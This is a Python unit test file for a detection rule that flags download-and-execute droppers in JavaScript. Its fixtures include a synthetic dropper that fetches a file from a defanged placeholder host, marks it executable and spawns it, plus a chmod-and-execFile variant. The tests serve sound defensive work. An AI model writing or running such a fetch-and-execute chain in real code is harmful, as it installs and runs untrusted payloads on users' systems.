"""Fire / silent / FP-guard unit tests for the S18 download-exec-dropper rule.

Inputs are SYNTHETIC — hand-authored reproductions of the *shape* of the ecm3401
``func_download_script`` payload (fetch a remote file, chmod +x it, spawn it) with
a defanged URL placeholder. The real PoC is **never** downloaded into the repo; no
live staging URL, no turnkey exec chain (see the detection-design README safety
section).
"""

from __future__ import annotations

from collections.abc import Callable

from static_runtime.context import StaticAnalysisContext
from static_runtime.rules.s18_download_exec_dropper import DownloadExecDropperRule

MakeContext = Callable[..., StaticAnalysisContext]

# Positive: full download -> writeStream -> chmod +x -> spawn chain, shared symbol
# (`file` is both the chmod target and the spawn target). Defanged URL placeholder.
_DROPPER = """
const https = require("https");
const fs = require("fs");
const cp = require("child_process");
const file = "/tmp/stage2";
function drop() {
  https.get("https://staging.placeholder.invalid/s", (res) => {
    res.pipe(fs.createWriteStream(file)).on("finish", () => {
      cp.execSync("chmod +x " + file);
      cp.spawn(file, { detached: true });
    });
  });
}
"""

# Positive: fs.chmod with an exec mode (0o755) + execFile, no shell chmod.
_DROPPER_FS_CHMOD = """
const fs = require("fs");
const { execFile } = require("child_process");
fs.chmodSync(payloadPath, 0o755);
execFile(payloadPath, []);
"""


def test_fires_high_on_download_chmod_spawn_chain(make_context: MakeContext) -> None:
    ctx = make_context(files={"drop.js": _DROPPER})
    findings = DownloadExecDropperRule().evaluate(ctx)
    assert len(findings) == 1
    finding = findings[0]
    assert finding.rule_id == "extrace.s18.download_exec_dropper"
    assert finding.severity.value == "high"
    # Remote fetch present AND shared symbol -> HIGH confidence.
    assert finding.confidence.value == "high"
    assert finding.adversary_class is None
    assert "extrace.ext.download_exec_dropper" in finding.categories
    assert "attack.T1105" in finding.categories
    assert finding.evidence


def test_fires_on_fs_chmod_exec_mode_then_execfile(make_context: MakeContext) -> None:
    ctx = make_context(files={"drop.js": _DROPPER_FS_CHMOD})
    findings = DownloadExecDropperRule().evaluate(ctx)
    assert len(findings) == 1
    # No remote fetch and shared symbol holds (payloadPath) -> still HIGH.
    assert findings[0].confidence.value == "high"


def test_silent_for_chmod_without_exec_sink(make_context: MakeContext) -> None:
    # The load-bearing FP guard: making a data file group-readable (0o644, no exec
    # bit) and never executing anything is benign housekeeping.
    src = 'const fs = require("fs");\nfs.chmodSync("./out/report.json", 0o644);\n'
    ctx = make_context(files={"util.js": src})
    assert DownloadExecDropperRule().evaluate(ctx) == []


def test_silent_for_exec_without_chmod(make_context: MakeContext) -> None:
    # A build extension that shells out to git — exec sink, but nothing is made
    # executable, so the drop-and-run conjunction does not hold.
    src = 'const cp = require("child_process");\ncp.execSync("git status");\n'
    ctx = make_context(files={"build.js": src})
    assert DownloadExecDropperRule().evaluate(ctx) == []


def test_silent_for_non_exec_chmod_mode(make_context: MakeContext) -> None:
    # chmod to 0o600 (rw-------, no exec bit) before a spawn of an unrelated tool
    # — the executable-bit conjunct is absent.
    src = (
        'const fs = require("fs");\n'
        'const cp = require("child_process");\n'
        "fs.chmodSync(tokenFile, 0o600);\n"
        'cp.spawn("node", ["server.js"]);\n'
    )
    ctx = make_context(files={"x.js": src})
    assert DownloadExecDropperRule().evaluate(ctx) == []
